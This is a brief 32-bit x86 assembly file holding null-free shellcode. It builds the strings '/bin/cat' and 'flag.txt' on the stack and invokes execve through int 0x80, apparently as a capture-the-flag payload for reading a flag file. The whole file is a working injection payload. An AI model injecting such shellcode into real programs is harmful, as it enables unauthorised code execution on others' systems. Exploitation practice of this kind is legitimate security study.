bits 32
;global main
global epstien:function

SECTION .text

;main:
epstien:
xor     eax,eax
push    eax
push    0x7461632f
push    0x6e69622f
mov     ebx,esp
push    eax
push    0x7478742e
push    0x67616c66
mov     ecx,esp
push    eax
push    ecx
push    ebx
mov     ecx,esp
xor     eax,eax
add     eax,0xb
int     0x80
